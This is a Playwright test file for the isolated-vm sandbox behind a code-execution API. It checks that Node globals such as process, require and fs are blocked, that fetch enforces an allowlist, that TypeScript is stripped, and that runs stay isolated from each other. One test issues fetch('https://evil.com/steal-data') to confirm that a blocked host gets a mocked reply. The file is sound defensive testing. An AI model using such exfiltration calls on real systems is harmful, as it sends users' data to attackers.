/**
 * sandbox-ivm.spec.ts — isolated-vm specific E2E tests
 *
 * Tests the /api/execute endpoint using the ivm backend:
 * - Security isolation: no process, require, fs, net, global leaks
 * - Stubbed fetch with allowlist enforcement
 * - TypeScript stripping via Node 22 stripTypeScriptTypes()
 * - Correct sandboxMode = "ivm" reported
 * - Memory isolation between runs
 * - Error propagation
 */
import { test, expect } from "@playwright/test";

const BASE = process.env.BASE_URL || "http://localhost:3000";

// Skip all ivm tests when running against Vercel (simulated mode)
const isLocal = !BASE.includes("vercel.app") && !BASE.includes("snippetci.com");

test.describe("IVM Sandbox — security isolation", () => {
  test.skip(!isLocal, "IVM tests only run against local server");

  test("JS: sandboxMode is ivm", async ({ request }) => {
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code: "console.log('ok')", language: "javascript", timeout_ms: 10000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(body.sandboxMode).toBe("ivm");
  });

  test("JS: process is undefined (no process access)", async ({ request }) => {
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code: "console.log(typeof process)", language: "javascript", timeout_ms: 5000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(body.stdout.trim()).toBe("undefined");
  });

  test("JS: require is undefined (no module system)", async ({ request }) => {
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code: "console.log(typeof require)", language: "javascript", timeout_ms: 5000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(body.stdout.trim()).toBe("undefined");
  });

  test("JS: cannot import fs via require", async ({ request }) => {
    const res = await request.post(`${BASE}/api/execute`, {
      data: {
        code: "try { require('fs'); console.log('got fs'); } catch(e) { console.error('blocked'); }",
        language: "javascript",
        timeout_ms: 5000,
      },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    // Either success=false (error) or stderr contains 'blocked'
    const output = body.stdout + body.stderr;
    expect(output).not.toContain("got fs");
  });

  test("JS: global.process is undefined", async ({ request }) => {
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code: "console.log(typeof global.process, typeof global.require)", language: "javascript", timeout_ms: 5000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(body.stdout.trim()).toBe("undefined undefined");
  });

  test("JS: cannot access __dirname or __filename", async ({ request }) => {
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code: "console.log(typeof __dirname, typeof __filename)", language: "javascript", timeout_ms: 5000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(body.stdout.trim()).toBe("undefined undefined");
  });
});

test.describe("IVM Sandbox — stubbed fetch", () => {
  test.skip(!isLocal, "IVM tests only run against local server");

  test("JS: fetch returns response for allowlisted host (github.com)", async ({ request }) => {
    const code = `
const r = await fetch('https://api.github.com/repos/nodejs/node');
const d = await r.json();
console.log(JSON.stringify({ ok: r.ok, status: r.status, hasData: typeof d === 'object' }));
`.trim();
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code, language: "javascript", timeout_ms: 10000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    const result = JSON.parse(body.stdout.trim());
    expect(result.ok).toBe(true);
    expect(result.status).toBe(200);
    expect(result.hasData).toBe(true);
  });

  test("JS: fetch returns mocked response for blocked host (evil.com)", async ({ request }) => {
    const code = `
const r = await fetch('https://evil.com/steal-data');
const d = await r.json();
console.log(JSON.stringify({ ok: r.ok, mocked: d.mocked }));
`.trim();
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code, language: "javascript", timeout_ms: 10000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    const result = JSON.parse(body.stdout.trim());
    // Returns mocked response (no real network)
    expect(result.ok).toBe(true);
    expect(result.mocked).toBe(true);
  });

  test("JS: fetch text() method works", async ({ request }) => {
    const code = `
const r = await fetch('https://api.github.com/users/octocat');
const t = await r.text();
console.log(typeof t);
`.trim();
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code, language: "javascript", timeout_ms: 10000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(body.stdout.trim()).toBe("string");
  });

  test("JS: HTTP (non-HTTPS) fetch returns mocked (allowlist only allows HTTPS)", async ({ request }) => {
    const code = `
const r = await fetch('http://example.com/api');
console.log(r.ok, r.status);
`.trim();
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code, language: "javascript", timeout_ms: 10000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    // Should succeed (mocked) but not real network
    expect(body.success).toBe(true);
  });
});

test.describe("IVM Sandbox — TypeScript stripping", () => {
  test.skip(!isLocal, "IVM tests only run against local server");

  test("TS: inline object type annotation works", async ({ request }) => {
    const code = `const r: { ok: boolean; value: number } = { ok: true, value: 42 };
console.log(JSON.stringify(r));`;
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code, language: "typescript", timeout_ms: 10000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    const result = JSON.parse(body.stdout.trim());
    expect(result.ok).toBe(true);
    expect(result.value).toBe(42);
    expect(body.sandboxMode).toBe("ivm");
  });

  test("TS: interface declaration works", async ({ request }) => {
    const code = `
interface WebhookPayload {
  id: string;
  event: string;
  createdAt: string;
}
const p: WebhookPayload = { id: "wh_01", event: "docs.verified", createdAt: new Date().toISOString() };
console.log(JSON.stringify({ id: p.id, event: p.event }));
`.trim();
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code, language: "typescript", timeout_ms: 10000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    const result = JSON.parse(body.stdout.trim());
    expect(result.id).toBe("wh_01");
    expect(result.event).toBe("docs.verified");
  });

  test("TS: generic function works", async ({ request }) => {
    const code = `
function wrap<T>(val: T): { value: T } {
  return { value: val };
}
console.log(JSON.stringify(wrap<string>("hello")));
`.trim();
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code, language: "typescript", timeout_ms: 10000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(body.stdout.trim()).toContain("hello");
  });

  test("TS: type alias works", async ({ request }) => {
    const code = `
type Status = "ok" | "error";
const s: Status = "ok";
console.log(s);
`.trim();
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code, language: "typescript", timeout_ms: 10000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(body.stdout.trim()).toBe("ok");
  });

  test("TS: as expression works", async ({ request }) => {
    const code = `
const val = (42 as unknown) as string;
console.log(typeof val, val);
`.trim();
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code, language: "typescript", timeout_ms: 10000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(body.stdout.trim()).toContain("42");
  });
});

test.describe("IVM Sandbox — execution and isolation", () => {
  test.skip(!isLocal, "IVM tests only run against local server");

  test("JS: runtime error reports correctly", async ({ request }) => {
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code: "throw new Error('intentional failure')", language: "javascript", timeout_ms: 5000 },
      headers: { "Content-Type": "application/json" },
    });
    expect(res.status()).toBe(422);
    const body = await res.json();
    expect(body.success).toBe(false);
    expect(body.error).toContain("intentional failure");
    expect(body.sandboxMode).toBe("ivm");
  });

  test("JS: ReferenceError reported correctly", async ({ request }) => {
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code: "console.log(undefinedVariable)", language: "javascript", timeout_ms: 5000 },
      headers: { "Content-Type": "application/json" },
    });
    expect(res.status()).toBe(422);
    const body = await res.json();
    expect(body.success).toBe(false);
    expect(body.stderr).toMatch(/undefinedVariable|ReferenceError/i);
  });

  test("JS: consecutive runs are isolated (no shared state)", async ({ request }) => {
    // Run 1: set a global variable
    const run1 = await request.post(`${BASE}/api/execute`, {
      data: { code: "globalThis.secretState = 'leaked';\nconsole.log('run1 done')", language: "javascript", timeout_ms: 5000 },
      headers: { "Content-Type": "application/json" },
    });
    expect((await run1.json()).success).toBe(true);

    // Run 2: try to read the global variable from run 1
    const run2 = await request.post(`${BASE}/api/execute`, {
      data: { code: "console.log(typeof globalThis.secretState)", language: "javascript", timeout_ms: 5000 },
      headers: { "Content-Type": "application/json" },
    });
    const body2 = await run2.json();
    expect(body2.success).toBe(true);
    // Should be undefined — each run gets a fresh isolate
    expect(body2.stdout.trim()).toBe("undefined");
  });

  test("JS: async/await with Promise.all works", async ({ request }) => {
    const code = `
const results = await Promise.all([
  Promise.resolve(1),
  Promise.resolve(2),
  Promise.resolve(3),
]);
console.log(JSON.stringify(results));
`.trim();
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code, language: "javascript", timeout_ms: 10000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(JSON.parse(body.stdout.trim())).toEqual([1, 2, 3]);
  });

  test("JS: durationMs is reported and reasonable", async ({ request }) => {
    const res = await request.post(`${BASE}/api/execute`, {
      data: { code: "console.log(1+1)", language: "javascript", timeout_ms: 5000 },
      headers: { "Content-Type": "application/json" },
    });
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(body.durationMs).toBeGreaterThan(0);
    expect(body.durationMs).toBeLessThan(5000);
  });
});
